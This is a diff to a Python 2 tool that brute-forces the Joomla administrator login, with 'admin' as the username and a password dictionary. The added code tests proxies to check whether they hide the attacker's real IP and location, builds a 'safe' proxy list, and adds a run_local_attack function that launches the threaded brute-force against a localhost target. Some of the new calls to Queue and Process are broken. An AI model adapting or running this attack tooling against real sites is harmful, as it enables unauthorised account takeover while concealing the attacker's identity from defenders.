@@ -6,10 +6,10 @@ import sys
 import Queue
 from HTMLParser import HTMLParser
 import socket
+import signal
 
-
-
-
+#from multiprocessing import Process, Queue
+import multiprocessing
 
 import random
 import datetime
@@ -27,6 +27,8 @@ target_post = "http://localhost/joomla/administrator/index.php"
 username_field= "username"
 password_field= "passwd"
 success_check = "Configuration"
+
+
 
 class Bruter(object):
 
@@ -166,7 +168,7 @@ def load_dictionnary(dictName):
 	tmpFile.close()
 
 	# convert into Queue
-	queryQ = Queue.Queue()
+	queryQ = multiprocessing.Queue()
 	words = [queryQ.put(query) for query in listOfPassword]
 
 	return queryQ
@@ -371,7 +373,7 @@ def test_proxy(proxy):
 	-> deal with connection timeout
 	"""
 
-	print proxy
+	print "[*] Test proxy: " +str(proxy)
 	
 	# Connect to a localisation site using a proxy
 	# Problem with proxy (timeout, not even sure the whole thing work)
@@ -448,16 +450,128 @@ def test_proxy(proxy):
 		if(ipProxy != ipAdress):
 			print "[!] proxy "+str(ipProxy)+" is not safe"
 			print "[!] we are traced back to "+ ipAdress +" ("+str(city)+", "+str(country) +")"
+			return 0
 		else:
 			print "[*] proxy "+str(ipProxy)+" is safe"
 			print "[*] connection from "+str(city)+", "+str(country)
+			return 1
 
 
 
 
-# Run the Attack
+
+def longfunction(queue):
+	"""
+	TODO:
+		- Rename the function
+	"""
+	proxy = select_randomProxyFromFile("proxyFromWeb_21_02.txt")
+	response = test_proxy(proxy)
+	queue.put(proxy)
+
+
+def call_of_longfunction(time_limit):
+	"""
+	-> time_limit is an integer, number of second to wait
+	   before kill the process
+	TODO:
+		- handle 404 Ecxeption
+		- Rename the function
+	"""
+	queue = Queue() #using to get the result
+	proc = Process(target=longfunction, args=(queue,)) #creation of a process calling longfunction with the specified arguments
+	proc.start() #lauching the processus on another thread
+	try:
+		res = queue.get(timeout=time_limit) #getting the resultat under 1 second or stop
+		proc.join() #proper delete if the computation has take less than timeout seconds
+		return 1
+	except: #catching every exception type
+		proc.terminate() #kill the process
+		print "[*] Too long, switching to next proxy"
+		return 0
+
+
+
+
+
+def test_all_proxy(time_limit):
+	"""
+	-> time_limit is an integer, number of second to wait
+	   before kill test of proxy
+	TODO:
+		- handle 404 & 111 and other web exceptions
+	"""
+	
+	now = datetime.datetime.now()
+	month = now.month
+	day = now.day
+	if(day < 10):
+		day = "0"+str(day)
+	if(month < 10):
+		month = "0"+str(month)
+	date = str(day)+"_"+str(month)
+	proxy_file_name = "proxyFromWeb_"+date+".txt"
+	proxy_file_name_secured = "proxyFromWeb_"+date+"_secured.txt"
+
+	proxy_file_safe = open(proxy_file_name_secured, "w")
+	proxy_file = open(proxy_file_name, "r")
+	for line in proxy_file:
+		line = line.split("\n")
+		line = line[0]
+		proxy = line
+
+		#proxy_safe = test_proxy(proxy)
+		proxy_safe = call_of_longfunction(time_limit)
+
+		if(proxy_safe):
+			proxy_file_safe.write(proxy+"\n")
+
+	proxy_file.close()
+	proxy_file_safe.close()
+
+
+
+def run_local_attack():
+	
+	"""
+	-> Test brute force attack on local installation
+	"""
+
+	# general settings
+	user_thread = 10
+	username = "admin"
+	wordlist_file = "dict.txt"
+	resume = None
+
+	# target specific settings
+	target_url = "http://localhost/joomla/administrator/index.php"
+	target_post = "http://localhost/joomla/administrator/index.php"
+	username_field= "username"
+	password_field= "passwd"
+	success_check = "Configuration"
+
+	words = load_dictionnary("dict.txt")
+	bruter_obj = Bruter(username, words)
+	bruter_obj.run_bruteforce()
+
+
+
+#--------------------------#
+# Create a good proxy list #
+#--------------------------#
 #clean()
+#update_proxyFileFromWeb()
+#test_all_proxy(5)
+
+
+
+#----------------#
+# Run the Attack #
+#----------------#
+"""
+clean()
 #create_proxyFileFromWeb()
+
 #update_proxyFileFromWeb()
 #proxy = select_randomProxyFromFile("proxyFromWeb.txt")
 #test_proxy(proxy)
@@ -465,3 +579,13 @@ def test_proxy(proxy):
 words = load_dictionnary("dict.txt")
 bruter_obj = Bruter(username, words)
 bruter_obj.run_bruteforce()
+
+
+update_proxyFileFromWeb()
+proxy = select_randomProxyFromFile("proxyFromWeb_21_02.txt")
+test_proxy(proxy)
+#print "=> " +str(proxy)
+"""
+
+run_local_attack()
+
